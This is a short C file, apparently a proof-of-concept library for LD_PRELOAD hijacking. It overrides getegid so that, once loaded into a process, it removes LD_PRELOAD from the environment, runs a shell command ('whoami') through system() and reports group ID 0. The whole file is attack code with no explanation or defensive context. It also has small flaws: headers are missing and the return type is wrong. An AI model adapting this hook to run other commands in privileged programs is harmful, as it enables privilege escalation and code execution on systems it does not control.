#include <unistd.h>
#include <sys/types.h>
uid_t getegid(void){
  if (getenv("LD_PRELOAD") == NULL){
        return 0;
    }
    unsetenv("LD_PRELOAD");
    system("whoami");
    return 0;
}
